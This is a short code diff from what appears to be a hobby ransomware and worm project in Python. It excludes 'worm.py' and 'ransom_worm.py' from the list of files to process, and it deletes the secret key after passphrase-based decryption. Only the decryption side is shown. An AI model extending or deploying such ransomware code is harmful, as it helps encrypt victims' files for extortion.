@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 files = [] 
 
 for file in os.listdir():
-    if file == "encrypt.py" or file =="secret_key.key" or file == "decrypt.py":
+    if file == "encrypt.py" or file =="secret_key.key" or file == "decrypt.py" or file =="worm.py" or file=="ransom_worm.py":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -26,5 +26,6 @@ if user_phrase == secretphrase:
         with open(file, "wb") as thefile:
             thefile.write(decrypted_contents)
         print("Correct! Your files are now decrypted!")
+        os.remove("secret_key.key")  #removes secret key after decryption
 else: 
     print("Sorry, wrong secret phrase!")
